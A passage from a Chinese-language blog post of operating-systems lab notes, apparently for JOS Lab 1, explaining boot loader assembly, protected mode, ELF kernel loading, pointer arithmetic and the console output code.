class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs assembly">  # Enable A20:<br>  #   For backwards compatibility with the earliest PCs, physical<br>  #   address line 20 is tied low, so that addresses higher than<br>  #   1MB wrap around to zero by default.  This code undoes this.<br>seta20.1:<br>  inb     $0x64,%al               # Wait for not busy<br>  testb   $0x2,%al<br>  jnz     seta20.1<br><br>  movb    $0xd1,%al               # 0xd1 -&gt; port 0x64<br>  outb    %al,$0x64<br><br>seta20.2:<br>  inb     $0x64,%al               # Wait for not busy<br>  testb   $0x2,%al<br>  jnz     seta20.2<br><br>  movb    $0xdf,%al               # 0xdf -&gt; port 0x60<br>  outb    %al,$0x60<br><br></code></pre></td></tr></table></figure><p>前三条指令读取了键盘控制器的0x64端口，并通过与2相与，来检测0x64的bit 1是否为1，也就是此时，输入缓冲区是否满了。只有当缓冲区不满时，才会执行后续代码</p><p><img src="/2023/11/29/OSlab1/image-20231203102700304.png" alt="image-20231203102700304"></p><p>后续将d1写入到0x64端口，d1代表下一次写入0x60端口的数据将被写入给804x控制器的输出端口。</p><p><img src="/2023/11/29/OSlab1/image-20231203104130794.png" alt="image-20231203104130794"></p><p>Seta20.2同理，表示将df写进0x60端口，df用于开启A20地址总线</p><p><img src="/2023/11/29/OSlab1/image-20231203104443964.png" alt="image-20231203104443964"></p><p><strong>什么是A20地址总线？：</strong></p><p>在早期的PC上处理器仅支持20位的地址空间，任何超过20位的地址都会被卷回。<br>例如：0xFFFF+0xFFFF &#x3D; 0x1FFFE -&gt; 0xFFFE</p><p>默认情况下，A20是置0的，进入保护模式前需要先打开A20以获得完全的寻址能力。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly"> # Switch from real to protected mode, using a bootstrap GDT<br> # and segment translation that makes virtual addresses <br> # identical to their physical addresses, so that the <br> # effective memory map does not change during the switch.<br> lgdt    gdtdesc<br> movl    %cr0, %eax<br> orl     $CR0_PE_ON, %eax<br> movl    %eax, %cr0<br> <br> ljmp    $PROT_MODE_CSEG, $protcseg<br> <br> <br> <br>.set PROT_MODE_CSEG, 0x8         # kernel code segment selector（这句在代码最开始）<br><br>gdtdesc:<br>.word   0x17                           # sizeof(gdt) - 1<br>   .long   gdt                            # address gdt<br></code></pre></td></tr></table></figure><p> lgdt gdtdesc，是把gdtdesc这个标识符（标识一个内存地址，共6个字节）送入全局映射描述符表寄存器GDTR中，后续将CR0的值置1，代表保护模式启动，最后的跳转表示将当前运行模式切换成32位地址模式</p><p><strong>什么是全局描述符表？</strong></p><p>记录的是内存各个段的信息，包括了段基址，段界限，段属性等信息。程序首先将对应的段选择子（可以理解为数组的索引）加载进入段寄存器中。然后在执行程序时，根据指令的内容确定应该使用的段寄存器，根据段寄存器中的段选择子确定应该使用的段描述符。再结合段描述符中包含的信息加上指令自身的地址构造出实际的物理地址。最终将该地址发送到地址总线上，到物理内存中寻址，并取回相应的数据。</p><p><img src="/2023/11/29/OSlab1/image-20231203110758011.png" alt="image-20231203110758011"></p><p>接下来是重新加载所有寄存器的值，这是按照规定来的，只有这样才能使刚刚加载完的GDTR值生效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">  .code32                     # Assemble for 32-bit mode<br>protcseg:<br>  # Set up the protected-mode data segment registers<br>  movw    $PROT_MODE_DSEG, %ax    # Our data segment selector<br>  movw    %ax, %ds                # -&gt; DS: Data Segment<br>  movw    %ax, %es                # -&gt; ES: Extra Segment<br>  movw    %ax, %fs                # -&gt; FS<br>  movw    %ax, %gs                # -&gt; GS<br>  movw    %ax, %ss                # -&gt; SS: Stack Segment<br></code></pre></td></tr></table></figure><p>接下来的指令就是设置esp寄存器的值，并正式跳转到main.c文件的main函数部分执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly"># Set up the stack pointer and call into C.<br>movl    $start, %esp<br>call bootmain<br></code></pre></td></tr></table></figure><h5 id="Main-c"><a href="#Main-c" class="headerlink" title="Main.c"></a>Main.c</h5><p>首先直接看Main.c的介绍</p><p><img src="/2023/11/29/OSlab1/image-20231203134914979.png" alt="image-20231203134914979"></p><p>这里可以看到main.c的任务是从硬盘引导一个ELF格式的内核镜像</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// read 1st page off disk</span><br>readseg((<span class="hljs-type">uint32_t</span>) ELFHDR, SECTSIZE*<span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>这里调用了一个函数readseg，这个函数的功能如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">readseg</span><span class="hljs-params">(uchar *pa, uint count, uint offset)</span>;<br></code></pre></td></tr></table></figure><p>把距离内核起始地址offset个偏移量存储单元作为起始，将它和它之后的count字节的数据读出送入以pa为起始地址的内存物理地址处。</p><p>所以main函数中，这条指令的意思就是把内核的前4MB的内容读取到ELFHDR中</p><p>接下来验证其是否为一个ELF文件</p><p><strong>什么是ELF？</strong></p><p>elf是一种文件格式，主要被用来把程序存放到磁盘上。是在程序被编译和链接后被创建出来的。一个elf文件包括多个段。对于一个可执行程序，通常包含存放代码的文本段(text section)，存放全局变量的data段，存放字符串常量的rodata段。elf文件的头部就是用来描述这个elf文件如何在存储器中存储。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// is this a valid ELF?</span><br><span class="hljs-keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC)<br>   <span class="hljs-keyword">goto</span> bad;<br></code></pre></td></tr></table></figure><p>elf头部信息的magic字段是整个头部信息的开端。并且如果这个文件是格式是ELF格式的话，文件的elf-&gt;magic应该是&#x3D;ELF_MAGIC的，所以这条语句就是判断这个输入文件是否是合法的elf可执行文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">ph = (<span class="hljs-keyword">struct</span> Proghdr *) ((<span class="hljs-type">uint8_t</span> *) ELFHDR + ELFHDR-&gt;e_phoff);<br></code></pre></td></tr></table></figure><p>头部中包含Program Header Table。这个表格存放着程序中所有段的信息。通过这个表我们才能找到要执行的代码段，数据段等等。所以我们要先获得这个表。</p><p>这条指令就可以完成这一点，首先elf是表头起址，而phoff字段代表Program Header Table距离表头的偏移量。所以ph可以被指定为Program Header Table表头。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">eph = ph + ELFHDR-&gt;e_phnum;<br></code></pre></td></tr></table></figure><p>e_phnum存放的时候Program Header Table中表项的个数，所以这里是将eph指向表的末尾</p><p><img src="/2023/11/29/OSlab1/image-20231203142338121.png" alt="image-20231203142338121"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (; ph &lt; eph; ph++)<br>  <span class="hljs-comment">// p_pa is the load address of this segment (as well</span><br>    <span class="hljs-comment">// as the physical address)</span><br>readseg(ph-&gt;p_pa, ph-&gt;p_memsz, ph-&gt;p_offset);<br></code></pre></td></tr></table></figure><p>ph-&gt;pa指的是这个段在内存中的物理地址。ph-&gt;offset字段指的是这一段的开头相对于这个elf文件的开头的偏移量。ph-&gt;filesz字段指的是这个段在elf文件中的大小。ph-&gt;memsz则指的是这个段被实际装入内存后的大小。这个for循环就是在加载所有的段到内存中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">((<span class="hljs-type">void</span> (*)(<span class="hljs-type">void</span>)) (ELFHDR-&gt;e_entry))();<br></code></pre></td></tr></table></figure><p>e_entry字段指向的是这个文件的执行入口地址。所以这里相当于开始运行这个文件。也就是内核文件。 自此就把控制权从boot loader转交给了操作系统的内核。</p><h4 id="练习4"><a href="#练习4" class="headerlink" title="练习4"></a>练习4</h4><p><strong>阅读5.1到5.5节。然后下载pointers.c的代码，并且编译运行它，确保你理解在屏幕上打印出来的所有的值是怎么来的。尤其要重点理解第1行，第6行的指针地址是如何得到的，以及在第2行到第4行的值是如何得到的，还有为什么在第5行打印出来的值看起来像程序崩溃了。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">void</span><br><span class="hljs-title function_">f</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> a[<span class="hljs-number">4</span>];           <span class="hljs-comment">//int型数组</span><br>    <span class="hljs-type">int</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16</span>);<span class="hljs-comment">//int类型指针</span><br>    <span class="hljs-type">int</span> *c;             <span class="hljs-comment">//int类型指针</span><br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1: a = %p, b = %p, c = %p\n&quot;</span>, a, b, c);<br>  <span class="hljs-comment">//a输出a数组首地址，b输出操作系统分配的内存空间的起始地址，c输出指针的值，此时是未一个未定义的值</span><br><br>    c = a;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>a[i] = <span class="hljs-number">100</span> + i; <span class="hljs-comment">//运行完，a中为100，101，102，103</span><br>    c[<span class="hljs-number">0</span>] = <span class="hljs-number">200</span>;       <span class="hljs-comment">//改a[0]为200</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,<br>   a[<span class="hljs-number">0</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">3</span>]);<br><br>    c[<span class="hljs-number">1</span>] = <span class="hljs-number">300</span>;<br>    *(c + <span class="hljs-number">2</span>) = <span class="hljs-number">301</span>;<br>    <span class="hljs-number">3</span>[c] = <span class="hljs-number">302</span>;      <span class="hljs-comment">//访问数组的三种不同方法，修改了a数组的值</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,<br>   a[<span class="hljs-number">0</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">3</span>]);<br><br>    c = c + <span class="hljs-number">1</span>;      <span class="hljs-comment">//c此时指向a[1]</span><br>    *c = <span class="hljs-number">400</span>;       <span class="hljs-comment">//修改a[1]为400</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;4: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,<br>   a[<span class="hljs-number">0</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">3</span>]);<br><br>    c = (<span class="hljs-type">int</span> *) ((<span class="hljs-type">char</span> *) c + <span class="hljs-number">1</span>);<br>    *c = <span class="hljs-number">500</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;5: a[0] = %d, a[1] = %d, a[2] = %d, a[3] = %d\n&quot;</span>,<br>   a[<span class="hljs-number">0</span>], a[<span class="hljs-number">1</span>], a[<span class="hljs-number">2</span>], a[<span class="hljs-number">3</span>]);<br><br>    b = (<span class="hljs-type">int</span> *) a + <span class="hljs-number">1</span>;<br>    c = (<span class="hljs-type">int</span> *) ((<span class="hljs-type">char</span> *) a + <span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;6: a = %p, b = %p, c = %p\n&quot;</span>, a, b, c);<br>&#125;<br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> ac, <span class="hljs-type">char</span> **av)</span><br>&#123;<br>    f();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/11/29/OSlab1/image-20231203150710971.png" alt="image-20231203150710971"></p><p>第五条，将c强制类型转换成char，此时，c的值为0x7ffd7b5c3474，加1后，为0x7ffd7b5c3475，再转换成int，这样会同时影响a[1], a[2]，此时c操作的区域为75-79</p><p><img src="/2023/11/29/OSlab1/image-20231203153045625.png" alt="image-20231203153045625"></p><p>所以a[1]变成128144，a[2]变成256</p><p>第六条，b取a的地址+1，但此时b是int类型指针，所以值实际+4</p><p>c将a地址转换成char类型，再+1，值也+1</p><h4 id="练习5"><a href="#练习5" class="headerlink" title="练习5:"></a>练习5:</h4><p><strong>再次追踪引导加载程序的前几条指令，找出如果引导加载程序的链接地址错误，将会“中断”或执行错误的第一条指令。然后在<code>boot/Makefrag</code>中将链接地址更改为错误的值，运行<code>make clean</code>，使用<code>make</code>重新编译实验，再次追踪引导加载程序，查看会发生什么。不要忘记随后将链接地址更改回正确值，并再次运行<code>make clean</code>！</strong></p><p><strong>链接地址</strong></p><p>链接地址可以理解为通过编译器链接器处理形成的可执行程序中指令的地址，即逻辑地址</p><p><strong>加载地址</strong></p><p>可执行文件真正被装入内存后运行的地址，即物理地址。</p><p>在Lab中作者说，BIOS默认把boot loader加载到0x7C00内存地址处，所以就要求boot loader的链接地址也要在0x7C00处。boot loader地址的设定是在boot&#x2F;Makefrag中完成的，所以修改这个值应该就是题目所要求的</p><p>根据题目要求，找到Makefrag中的链接位置，这里将0x7c00修改成0x7e00，重新执行make</p><p><img src="/2023/11/29/OSlab1/image-20231203155358101.png" alt="image-20231203155358101"></p><p>下图这条指令是把指令后面的值所指定内存地址处后6个字节的值输入全局描述符表寄存器GDTR，但是当前这条指令读取的内存地址是0x7e64，这里存入的全部是0，就导致了GDT表读取的值不正确，如果要进入保护模式，就必须要先启动分段机制，如果全局描述符表读取不正确，段的信息也不正确，自然无法成功启动</p><p><img src="/2023/11/29/OSlab1/image-20231203162346709.png" alt="image-20231203162346709"></p><p>继续执行，运行到这里之后就出错了，因为实际要跳转去的位置是0x7c32</p><p><img src="/2023/11/29/OSlab1/image-20231203163201635.png" alt="image-20231203163201635"></p><h4 id="练习6"><a href="#练习6" class="headerlink" title="练习6"></a>练习6</h4><p><strong>在BIOS进入Boot loader时检查在0x00100000处的8个字，然后在引导加载程序进入内核时再次检查。 他们为什么不同？</strong> </p><p>答：在BIOS进入Boot loader时，0x100000内存后的8个字都为零，因为此时内核程序还没有加载进入内存。 内核的加载在<code>bootmain</code>函数中完成。</p><p><img src="/2023/11/29/OSlab1/image-20231207173300436.png" alt="image-20231207173300436"></p><p><img src="/2023/11/29/OSlab1/image-20231207173652370.png" alt="image-20231207173652370"></p><h3 id="第三部分：Loading-the-Kernel"><a href="#第三部分：Loading-the-Kernel" class="headerlink" title="第三部分：Loading the Kernel"></a>第三部分：Loading the Kernel</h3><h4 id="练习7"><a href="#练习7" class="headerlink" title="练习7"></a>练习7</h4><p>使用QEMU和GDB来跟踪进入JOS内核并在movl %eax, %cr0处停下来。检查地址0x00100000和0xf0100000的内存。现在，使用GDB命令stepi单步执行该指令。再次检查地址0x00100000和0xf0100000的内存。确保你理解刚刚发生的事情。</p><p>在新映射建立后，如果映射没有生效，会导致无法正常工作的第一条指令是什么？将kern&#x2F;entry.S中的movl %eax, %cr0注释掉，进行跟踪，看看你是否正确。</p><p>操作系统内核通常被链接到非常高的虚拟地址（例如0xf0100000）下运行，以便留下处理器虚拟地址空间的低地址部分供用户程序使用。</p><p>许多机器在地址范围无法达到<code>0xf0100000</code>，因此我们无法指望能够在那里存储内核。相反，我们将使用处理器的内存管理硬件将虚拟地址<code>0xf0100000</code>（内核代码期望运行的链接地址）映射到物理地址<code>0x00100000</code>（引导加载程序将内核加载到物理内存中）。</p><p>现在，我们只需映射前4MB的物理内存，这足以让我们启动并运行。 我们使用<code>kern/entrypgdir.c</code>中手写的，静态初始化的页面目录和页表来完成此操作。</p><p>为了实现虚拟地址，需要通过CR0，这个寄存器的第31位是分页标志</p><p><img src="/2023/11/29/OSlab1/image-20231203203708983.png" alt="image-20231203203708983"></p><p>显然在执行完mov %eax，%cr0后，地址映射成功了</p><p><img src="/2023/11/29/OSlab1/image-20231203204834851.png" alt="image-20231203204834851"></p><p>猜测会出错的是mov $relocated, %eax，relocated这个的地址是段地址+偏移地址得到的，如果映射失败，那么段地址将还是在高地址，计算后，应该会导致越界错误，通过gdb验证：</p><p><img src="/2023/11/29/OSlab1/image-20231203205746371.png" alt="image-20231203205746371"></p><p>注释了之后，发现地址映射确实失败，继续运行，到mov $relocated, %eax时，qemu也打印出了错误终止运行。</p><h4 id="练习8"><a href="#练习8" class="headerlink" title="练习8"></a>练习8</h4><p><strong>我们省略了一小段代码 - 使用“%o”形式的模式打印八进制数所需的代码。找到并填写此代码片段。</strong></p><p>题目要求我们阅读三个源文件（\kern\printf.c , \kern\console.c , \lib\printfmt.c）的代码，并弄清楚他们的关系</p><ul><li><strong>\kern\printf.c</strong>中的cprintf，vcprintf子程序调用了<strong>\lib\printfmt.c</strong>中的<strong>vprintfmt</strong>子程序。</li><li><strong>\kern\printf.c</strong>中的putch子程序中调用了<strong>cputchar</strong>，这个程序是定义在<strong>\kern\console.c</strong>中的。</li><li><strong>\lib\printfmt.c</strong>中的一些功能也依赖于<strong>cputchar</strong>子程序</li></ul><p>所以得出结论，<strong>\kern\printf.c</strong>，<strong>\lib\printfmt.c</strong>两个文件的功能依赖于<strong>\kern\console.c</strong>的功能。所以我们就看一下<strong>\kern\console.c</strong>。</p><p><strong>\kern\console.c</strong>：</p><p>代码较长，关注较为重要的cputchar</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// `High&#x27;-level console I/O.  Used by readline and cprintf.</span><br><span class="hljs-type">void</span><br><span class="hljs-title function_">cputchar</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    cons_putc(c);<br>&#125;<br><br><span class="hljs-comment">// output a character to the console</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cons_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    serial_putc(c);<br>    lpt_putc(c);<br>    cga_putc(c);<br>&#125;<br></code></pre></td></tr></table></figure><p>那么再看serial_putc(c)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM1        0x3F8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_TX        0    <span class="hljs-comment">// Out: Transmit buffer (DLAB=0)</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_LSR        5    <span class="hljs-comment">// In:    Line Status Register</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COM_LSR_TXRDY    0x20    <span class="hljs-comment">//   Transmit buffer avail 具体含义/全程</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">serial_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;<br>         !(inb(COM1 + COM_LSR) &amp; COM_LSR_TXRDY) &amp;&amp; i &lt; <span class="hljs-number">12800</span>;<br>         i++)<br>        delay();<br><br>    outb(COM1 + COM_TX, c);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这段代码实际上是控制0x3F8+5 &#x3D; 0x3FD， 0x3F8+0 &#x3D; 0x3F8这两个端口</p><p>通过查询端口功能，可以知道：inb指令是读取0x3fd端口的内容，并且判断它的bit5是否为1，即发送数据缓冲寄存器是否为空。如果为空，则计算机可以发送下一个数据给端口。</p><p>而outb指令则是把要发送的数据c，发送给0x3f8，从上图中可见，当0x3f8端口被写入值时，他是作为发送数据缓冲寄存器的，里面存放要发送给串口的数据。</p><p>lpt_putc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/***** Parallel port output code *****/</span><br><span class="hljs-comment">// For information on PC parallel port programming, see the class References</span><br><span class="hljs-comment">// page.</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">lpt_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; !(inb(<span class="hljs-number">0x378</span>+<span class="hljs-number">1</span>) &amp; <span class="hljs-number">0x80</span>) &amp;&amp; i &lt; <span class="hljs-number">12800</span>; i++)<br>        delay();<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">0</span>, c);<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">2</span>, <span class="hljs-number">0x08</span>|<span class="hljs-number">0x04</span>|<span class="hljs-number">0x01</span>);<br>    outb(<span class="hljs-number">0x378</span>+<span class="hljs-number">2</span>, <span class="hljs-number">0x08</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>原理上也是在操作IO端口，经过查询，这段代码用于向PC并行端口发送字符，并通过轮询的方式等待端口准备好接收数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">cga_putc</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span><br>&#123;<br>    <span class="hljs-comment">// if no attribute given, then use black on white</span><br>    <span class="hljs-keyword">if</span> (!(c &amp; ~<span class="hljs-number">0xFF</span>))<br>        c |= <span class="hljs-number">0x0700</span>;<br><br>    <span class="hljs-keyword">switch</span> (c &amp; <span class="hljs-number">0xff</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\b&#x27;</span>: <span class="hljs-comment">//退格</span><br>        <span class="hljs-keyword">if</span> (crt_pos &gt; <span class="hljs-number">0</span>) &#123;<br>            crt_pos--;<br>            crt_buf[crt_pos] = (c &amp; ~<span class="hljs-number">0xff</span>) | <span class="hljs-string">&#x27; &#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\n&#x27;</span>:  <span class="hljs-comment">//换行</span><br>        crt_pos += CRT_COLS;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\r&#x27;</span>:  <span class="hljs-comment">//回车符，将光标移动到当前行开头</span><br>        crt_pos -= (crt_pos % CRT_COLS);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\t&#x27;</span>:  <span class="hljs-comment">//制表</span><br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        cons_putc(<span class="hljs-string">&#x27; &#x27;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:    <span class="hljs-comment">//普通字符</span><br>        crt_buf[crt_pos++] = c;        <span class="hljs-comment">/* write the character */</span><br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-comment">// What is the purpose of this?</span><br>    <span class="hljs-keyword">if</span> (crt_pos &gt;= CRT_SIZE) &#123;   <span class="hljs-comment">//检查是否到达屏幕缓冲区的末尾</span><br>        <span class="hljs-type">int</span> i;       <br><br>        memmove(crt_buf, crt_buf + CRT_COLS, (CRT_SIZE - CRT_COLS) * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint16_t</span>));                 <span class="hljs-comment">//屏幕内容上滚一行</span><br>        <span class="hljs-keyword">for</span> (i = CRT_SIZE - CRT_COLS; i &lt; CRT_SIZE; i++)<br>            crt_buf[i] = <span class="hljs-number">0x0700</span> | <span class="hljs-string">&#x27; &#x27;</span>; <span class="hljs-comment">//清空最后一行的内容，设置为空格</span><br>        crt_pos -= CRT_COLS;         <span class="hljs-comment">//将光标移动到新一行的开头</span><br>    &#125;<br><br>    <span class="hljs-comment">/* move that little blinky thing */</span><br>    outb(addr_6845, <span class="hljs-number">14</span>);<br>    outb(addr_6845 + <span class="hljs-number">1</span>, crt_pos &gt;&gt; <span class="hljs-number">8</span>);<br>    outb(addr_6845, <span class="hljs-number">15</span>);<br>    outb(addr_6845 + <span class="hljs-number">1</span>, crt_pos);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>\lib\printfmt.c：</strong></p><p>这个文件开头有一段注释：</p><p>“打印各种样式的字符串的子程序，经常被printf，sprintf，fprintf函数所调用，这些代码是同时被内核和用户程序所使用的。”所以，这里这个文件中定义的子程序是我们能在编程时直接利用printf函数向屏幕输出信息的关键</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 